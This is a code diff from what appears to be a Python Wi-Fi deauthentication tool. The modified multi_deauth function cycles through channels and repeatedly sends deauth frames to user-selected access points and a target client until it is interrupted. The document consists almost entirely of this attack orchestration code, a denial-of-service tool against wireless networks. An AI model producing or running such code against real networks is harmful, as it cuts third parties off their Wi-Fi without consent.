@@ -4,12 +4,12 @@ from APshandler import *
 from deauth import *
 import time
 
-apid_pos = 0
+signal_strength_pos = 0
 ssid_pos = 1
 bssid_pos = 2
 channel_pos = 3
 encryption_pos = 4
-
+select_pos = 5
 channels = []
 
 def channel_exist(channel):
@@ -28,22 +28,22 @@ def multi_deauth(fileName,interface,client):
     aps_data.close()
     aps = apsList["aps"]
     channels = []
-    for ap in aps:
-        channel = str(ap[channel_pos])
-        if not channel_exist(channel):
-            channels.append(channel)
-    interface = monitor_up(interface)
+    for apid in range(len(aps)):
+        if aps[apid][select_pos] == True:
+            channel = aps[apid][channel_pos]
+            if not channel_exist(channel):
+                channels.append(channel)
     try:
         while True:
-            for channel in range(0,len(channels)):
+            for channel in range(len(channels)):
                 channel_set(channels[channel],interface)
-                for ap in aps:
-                    if str(ap[channel_pos]) == channels[channel]:
-                        bssid = str(ap[bssid_pos])
+                for apid in range(len(aps)):
+                    if aps[apid][select_pos] == True:
+                        bssid = aps[apid][bssid_pos]
                         deauth(interface, bssid, client)
                 time.sleep(2)
     except KeyboardInterrupt:
-        interface = monitor_down(interface)
+        print('[Stop]')
 
 
  
